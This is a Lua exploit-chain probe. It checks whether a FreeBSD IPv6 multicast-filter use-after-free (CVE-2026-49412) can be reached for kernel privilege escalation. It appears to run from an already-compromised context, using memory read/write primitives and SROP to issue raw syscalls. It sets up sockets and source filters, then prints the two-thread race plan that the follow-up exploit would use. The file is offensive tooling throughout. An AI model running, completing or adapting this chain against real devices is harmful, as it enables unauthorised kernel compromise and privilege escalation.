-- CRASH_CLASS: LOW
-- PROBE 179a: CVE-2026-49412 IPV6_MSFILTER reachability test
--
-- FreeBSD-SA-26:29.ip6_multicast: UAF in IPV6_MSFILTER handler.
-- The handler drops its lock during copyin, another thread can free
-- the multicast filter → dangling pointer → kernel privesc.
--
-- Prerequisites: IPv6 socket, setsockopt(IPV6_MSFILTER), two threads.
-- We have all of these: AF_INET6 sockets, thr_create(430), SROP.
--
-- This probe tests REACHABILITY only:
-- Step 1: Create AF_INET6 DGRAM socket
-- Step 2: Join a multicast group (IPV6_JOIN_GROUP, option 12)
-- Step 3: Set source filter (IPV6_MSFILTER, option 74)
-- Step 4: Get source filter (getsockopt IPV6_MSFILTER)
-- The race exploit is 179b (only if these return 0).

print("=== 179a: IPV6_MSFILTER REACHABILITY ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex64(val)
    local h, l = get_hi_lo(val)
    return string.format("0x%X%08X", h, l)
end
local function wq(a,v) memory.write_qword(a,v) end
local function wd(a,v) memory.write_dword(a,v) end
local function rd(a) return to_num(memory.read_dword(a)) end
local function rq(a) return memory.read_qword(a) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

-- SROP setup
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local brip = rq(ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sca = uint64(string.format("0x%X%08X", rh, rl - 2))
print("srop_ok")

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(ctx)) end)
    wq(ctx + MC + 0xA0, sca)
    wq(ctx + MC + 0x38, uint64(num))
    if a1 then wq(ctx + MC + 0x08, a1) end
    if a2 then wq(ctx + MC + 0x10, a2) end
    if a3 then wq(ctx + MC + 0x18, a3) end
    if a4 then wq(ctx + MC + 0x50, a4) end
    if a5 then wq(ctx + MC + 0x28, a5) end
    if a6 then wq(ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    if not ok then return nil end
    return rv
end

-- GPU buffer
local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x10000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end
print("gpu=" .. hex64(gpu))

-- Constants
local AF_INET6 = 28
local SOCK_DGRAM = 2
local IPPROTO_IPV6 = 41
local IPV6_JOIN_GROUP = 12     -- struct ipv6_mreq
local IPV6_LEAVE_GROUP = 13
local IPV6_MSFILTER = 74       -- struct group_filter

-- Step 1: Create IPv6 DGRAM socket
print("")
print("--- STEP 1: AF_INET6 SOCKET ---")
local rv = srop(97, uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(0))
local s6 = rv and to_num(rv) or -1
print("socket(AF_INET6, DGRAM)=" .. s6)
if s6 < 0 then
    -- Try with explicit protocol
    rv = srop(97, uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(17)) -- UDP
    s6 = rv and to_num(rv) or -1
    print("socket(AF_INET6, DGRAM, UDP)=" .. s6)
end
if s6 < 0 then print("NO IPV6 SOCKET") return end

-- Step 2: Bind to any addr (needed for multicast)
print("")
print("--- STEP 2: BIND ---")
-- struct sockaddr_in6: 1 byte len, 1 byte family, 2 byte port, 4 byte flowinfo,
--                      16 byte addr, 4 byte scope_id = 28 bytes total
local BIND = 0x1000
for i = 0, 0x1F, 4 do wd(gpu + BIND + i, 0) end
-- FreeBSD sockaddr_in6: sin6_len=28, sin6_family=AF_INET6(28)
wd(gpu + BIND, 0x001C001C)  -- len=28, family=28, port=0
-- addr = :: (all zeros = any)
rv = srop(104, uint64(s6), ga(BIND), uint64(28)) -- bind
local bret = rv and to_num(rv) or -999
print("bind=" .. bret)

-- Step 3: Join multicast group ff02::1 (all nodes)
print("")
print("--- STEP 3: JOIN MULTICAST ---")
-- struct ipv6_mreq: 16 byte multicast addr + 4 byte interface index = 20 bytes
local MREQ = 0x2000
for i = 0, 0x1F, 4 do wd(gpu + MREQ + i, 0) end
-- ff02::1 (link-local all-nodes multicast)
wd(gpu + MREQ, 0x000002FF)  -- ff02 in network byte order (LE: 0xFF, 0x02, 0x00, 0x00)
-- Actually: ff02::1 is FF020000 00000000 00000000 00000001
-- In memory (little-endian dwords): 0x000002FF, 0, 0, 0x01000000
wd(gpu + MREQ + 0, 0x000002FF)
wd(gpu + MREQ + 4, 0)
wd(gpu + MREQ + 8, 0)
wd(gpu + MREQ + 12, 0x01000000)
wd(gpu + MREQ + 16, 0)  -- ifindex = 0 (any)

-- setsockopt(s6, IPPROTO_IPV6, IPV6_JOIN_GROUP, &mreq, 20)
rv = srop(105, uint64(s6), uint64(IPPROTO_IPV6), uint64(IPV6_JOIN_GROUP),
    ga(MREQ), uint64(20))
local jret = rv and to_num(rv) or -999
print("setsockopt(JOIN_GROUP)=" .. jret)

if jret ~= 0 then
    -- Try different multicast addr: ff01::1 (node-local)
    wd(gpu + MREQ + 0, 0x000001FF)
    rv = srop(105, uint64(s6), uint64(IPPROTO_IPV6), uint64(IPV6_JOIN_GROUP),
        ga(MREQ), uint64(20))
    jret = rv and to_num(rv) or -999
    print("setsockopt(JOIN_GROUP ff01::1)=" .. jret)
end

-- Step 4: Set source filter (IPV6_MSFILTER)
print("")
print("--- STEP 4: IPV6_MSFILTER ---")
-- struct group_filter (FreeBSD):
--   uint32_t  gf_interface;    +0x00
--   struct sockaddr_storage gf_group;  +0x04 (128 bytes)
--   uint32_t  gf_fmode;        +0x84
--   uint32_t  gf_numsrc;       +0x88
--   struct sockaddr_storage gf_slist[1]; +0x8C (128 bytes each)
-- Total for 0 sources: 0x8C bytes
-- Total for 1 source: 0x8C + 128 = 0x10C bytes

local GF = 0x3000
for i = 0, 0x1FF, 4 do wd(gpu + GF + i, 0) end

-- gf_interface = 0
wd(gpu + GF + 0, 0)
-- gf_group = sockaddr for ff02::1
-- sockaddr_storage starts at +4, FreeBSD sockaddr_in6 inside it:
wd(gpu + GF + 4, 0x001C001C)  -- sin6_len=28, sin6_family=28, port=0
wd(gpu + GF + 4 + 8, 0x000002FF)  -- ff02::
wd(gpu + GF + 4 + 12, 0)
wd(gpu + GF + 4 + 16, 0)
wd(gpu + GF + 4 + 20, 0x01000000)  -- ::1
-- gf_fmode = MCAST_INCLUDE (1)
wd(gpu + GF + 0x84, 1)
-- gf_numsrc = 0 (empty source list = accept all)
wd(gpu + GF + 0x88, 0)

-- setsockopt(s6, IPPROTO_IPV6, IPV6_MSFILTER, &gf, 0x8C)
rv = srop(105, uint64(s6), uint64(IPPROTO_IPV6), uint64(IPV6_MSFILTER),
    ga(GF), uint64(0x8C))
local mf_set = rv and to_num(rv) or -999
print("setsockopt(MSFILTER, INCLUDE, 0 src)=" .. mf_set)

if mf_set == 0 then
    print("!!! IPV6_MSFILTER IS REACHABLE !!!")
    print("!!! CVE-2026-49412 RACE CONDITION MAY BE EXPLOITABLE !!!")

    -- Try getsockopt to read it back
    local OPT = 0x4000
    for i = 0, 0x1FF, 4 do wd(gpu + OPT + i, 0) end
    -- Copy the group filter request
    for i = 0, 0x8B, 4 do wd(gpu + OPT + i, rd(gpu + GF + i)) end
    local OLEN = 0x5000
    wd(gpu + OLEN, 0x200)  -- optlen
    -- getsockopt(s6, IPPROTO_IPV6, IPV6_MSFILTER, &gf, &optlen)
    rv = srop(118, uint64(s6), uint64(IPPROTO_IPV6), uint64(IPV6_MSFILTER),
        ga(OPT), ga(OLEN))
    local mf_get = rv and to_num(rv) or -999
    print("getsockopt(MSFILTER)=" .. mf_get)
    if mf_get == 0 then
        local optlen = rd(gpu + OLEN)
        local fmode = rd(gpu + OPT + 0x84)
        local numsrc = rd(gpu + OPT + 0x88)
        print("  optlen=" .. optlen .. " fmode=" .. fmode .. " numsrc=" .. numsrc)
    end

    -- Try with 1 source
    print("")
    print("--- STEP 4b: MSFILTER WITH 1 SOURCE ---")
    wd(gpu + GF + 0x88, 1)  -- gf_numsrc = 1
    -- gf_slist[0] = sockaddr for ::1 (loopback)
    local SL = GF + 0x8C
    for i = 0, 0x7F, 4 do wd(gpu + SL + i, 0) end
    wd(gpu + SL, 0x001C001C)  -- sin6_len=28, sin6_family=28
    wd(gpu + SL + 8 + 12, 0x01000000)  -- ::1

    rv = srop(105, uint64(s6), uint64(IPPROTO_IPV6), uint64(IPV6_MSFILTER),
        ga(GF), uint64(0x10C))
    local mf_set2 = rv and to_num(rv) or -999
    print("setsockopt(MSFILTER, INCLUDE, 1 src)=" .. mf_set2)

    if mf_set2 == 0 then
        print("!!! MSFILTER WITH SOURCES WORKS !!!")
        print("!!! RACE CONDITION IS EXPLOITABLE !!!")
        print("!!! Thread A: setsockopt(MSFILTER) with large source list")
        print("!!! Thread B: close(socket) or leave_group during copyin")
    end
else
    print("MSFILTER rejected — trying alternative option numbers")
    -- FreeBSD versions differ; try nearby options
    for opt = 72, 76 do
        if opt ~= 74 then
            rv = srop(105, uint64(s6), uint64(IPPROTO_IPV6), uint64(opt),
                ga(GF), uint64(0x8C))
            local alt = rv and to_num(rv) or -999
            print("  opt " .. opt .. "=" .. alt)
        end
    end

    -- Also test MCAST_JOIN_SOURCE_GROUP (option 82 on FreeBSD)
    rv = srop(105, uint64(s6), uint64(IPPROTO_IPV6), uint64(82),
        ga(GF), uint64(0x8C))
    local mjsg = rv and to_num(rv) or -999
    print("  MCAST_JOIN_SOURCE_GROUP(82)=" .. mjsg)
end

-- Step 5: Also test raw IPv6 socket
print("")
print("--- STEP 5: RAW IPV6 SOCKET ---")
rv = srop(97, uint64(AF_INET6), uint64(3), uint64(0))  -- SOCK_RAW
local s6r = rv and to_num(rv) or -1
print("socket(AF_INET6, RAW)=" .. s6r)

-- Cleanup
srop(6, uint64(s6))
if s6r >= 0 then srop(6, uint64(s6r)) end

print("")
print("pid_post=" .. to_num(make_syscall(20)()))
print("=== DONE ===")
